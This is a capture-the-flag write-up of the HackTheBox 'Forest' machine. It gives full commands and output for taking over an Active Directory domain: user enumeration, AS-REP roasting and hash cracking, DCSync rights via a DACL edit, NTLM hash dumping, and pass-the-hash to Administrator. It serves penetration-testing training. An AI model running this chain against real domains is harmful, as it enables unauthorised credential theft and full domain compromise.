---
layout: post
title:  "Forest (HackTheBox) Writeup"
date:   2026-01-30 13:00:00 +0530
categories: [HackTheBox, Active Directory]
---


**Forest** is a **Hack The Box (HTB)** Windows machine that introduces core Active Directory attack techniques through a realistic domain environment. The machine emphasizes the importance of LDAP enumeration, Kerberos-based attacks, and abusing excessive privileges assigned to domain users.

**Hack The Box:** [Forest](https://app.hackthebox.com/machines/Forest)


## Enumeration

Starting with the nmap scan.

```
❯ nmap -p 1-10000 -sCV -O -T4 -Pn 10.129.95.210
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 18:00 IST
Nmap scan report for 10.129.95.210
Host is up (0.68s latency).
Not shown: 9987 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-28 12:40:07Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf       .NET Message Framing
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=1/28%OT=53%CT=1%CU=42893%PV=Y%DS=2%DC=I%G=Y%TM=697A02D
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=RD%CI=RD%II=I%TS=8)S
OS:EQ(SP=105%GCD=1%ISR=10D%TI=RD%CI=I%II=I%TS=B)SEQ(SP=106%GCD=1%ISR=108%TI
OS:=RD%CI=RD%II=I%TS=9)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SE
OS:Q(SP=FD%GCD=1%ISR=10C%TI=RD%CI=I%II=I%TS=A)OPS(O1=M542NW8ST11%O2=M542NW8
OS:ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:42NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h44m57s, deviation: 4h37m10s, median: 4m56s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-01-28T04:41:10-08:00
| smb2-time: 
|   date: 2026-01-28T12:41:08
|_  start_date: 2026-01-28T12:34:06
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required


```

The result showed that the target is a Windows Active Directory Domain Controller. The domain was identified as **htb.local**.
Its running **Windows Server 2016**, with  AD services running.

Next, I used **rpcclient** to enumerate domain users and was able to retrieve a list of valid usernames with anonymous access.

```
❯ rpcclient -U "" -N 10.129.95.210

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

```

Once valid domain users were identified, I attempted **AS-REP Roasting** to check for accounts with Kerberos pre-authentication disabled.
User **alfresco** have kerberos preauthentication disabled, which allowed an AS-REP hash to be requested without valid credentials.

```
❯ GetNPUsers.py htb.local/ \
  -dc-ip 10.129.95.210 \
  -usersfile users.txt \
  -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User forest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:fbcf02fcf9f4cceb5925005977036b17$1a1a3ba156f634315ea86bac9a67a5ba9247545a3d887776dac5bb79528c362233600a2a770d427a6920ea80a094c4839fe7e2ead4d2a6d97e57d5a4b52b666429971994bde4fc4a0978d4defe13b938d982bd09ff8adbff3e22cb2388fed8751b3c4352d6aaf600a61282f4e6d06ff88f9664d6381e5dfa00946768d14dba6a983580ddae31f87a6d1bdcfc4eecc70c887da2e3db630ae1854df994450ee4338cd450b27235a87c9bbbad138b9c1c6874e5eb16b2305dc8378ff62368fe5c229edcb037b788bd6fffac9f10a8ed4fa67b028a3a39d4fa2982186f2122bf790369a3a0db1250
```

Next, I used **hascat** to crack the hash for user **svc-alfresco**.

```
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt

```

```
user :       svc-alfresco   
password:    s3rvice

```

## Initial Foothold

After getting  valid credentials for the **`svc-alfresco`**, I used **Evil-WinRM** to get the shell on the target machine.
I was able to retrieve the **user flag** from the desktop.

```
❯ evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
21eb7b028df041379f1418fe********

```

## bloodhound

With initial access as svc-alfresco, the next step was to enumerate Active Directory relationships and permissions to identify possible paths to Domain Administrator. For this, I used **bloodhound-python**.

```
❯ bloodhound-python \                                 
  -u Tsvc-alfresco \
  -p 's3rvice' \
  -d htb.local \
  -ns 10.129.95.210 \
  -c All
```

And I found myself a privilege escalation path from **SVC-ALFRESCO** to **ADMINISTRATOR**. Our main focus is on GenericAll and WriteDacl edges. First, the compromised account could exploit **GenericAll** permissions over the **Exchange Windows Permissions** group. From there, abusing **WriteDACL** rights on the **htb.local** domain, enabling modification of domain-level access control lists.

![](/assets/image/forest-htb/Screenshot%202026-01-28%20190811.png)


## Privilege Escalation

Firstly, I got myself a shell on the target machine using the valid credentials. Next I will be abusing the **GenericAll** to make 
svc-alfresco a member of the **Exchange Windows Permissions** completing first jump.

```
❯ evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'

```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" svc-alfresco /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user svc-alfresco /domain
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2026 8:51:10 AM
Password expires             Never
Password changeable          1/29/2026 8:51:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/28/2026 7:38:10 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
                             *Service Accounts
The command completed successfully.

```

Second jump included abusing the **WriteDacl**. This permission allows modification of the **domain’s access control list**, making it possible to grant replication privileges to an attacker-controlled account.

```
❯ dacledit.py -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' -dc-ip 10.129.95.210 'htb.local'/'svc-alfresco':'s3rvice'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260128-222418.bak
[*] DACL modified successfully!

```

After successfully abusing **WriteDACL** and performing a **DCSync attack**, I was able to dump the NTLM hashes for domain accounts using **secretsdump.py**.

```
❯ secretsdump.py 'htb.local'/'svc-alfresco':'s3rvice'@10.129.95.210

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter

```

Now that the domain is compromised. I performed a **pass-the-hash** attack to authenticate as **Administrator** and obtain a shell using **WinRM**.
The **root flag** was retrieved from the administrator Desktop.

```
❯ evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
36c259260b83507b1ae5f9**********

```